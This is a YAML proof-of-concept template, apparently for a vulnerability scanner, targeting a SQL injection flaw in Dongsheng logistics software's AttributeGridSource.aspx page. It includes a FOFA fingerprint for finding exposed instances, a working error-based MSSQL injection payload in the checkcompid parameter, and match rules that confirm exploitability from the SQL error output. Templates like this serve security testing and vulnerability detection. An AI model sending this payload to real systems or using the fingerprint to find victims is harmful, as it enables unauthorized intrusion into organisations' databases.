id: poc-yaml-dongshengsoft-attributegridsource-aspx-sqli
info:
  name: 东胜物流软件 AttributeGridSource.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 东胜物流软件
  fofa: app="东胜物流软件-物流软件"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /Attributes/AttributeGridSource.aspx?handle=compattrlistpage&checkcompid='and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"SqlException:")
    && contains(body,"AttributeGridSource.aspx") && matches(body,"转换成数据类型(.*?)时失败")
    && matches(body,"在将(.*?)值")
transport: http
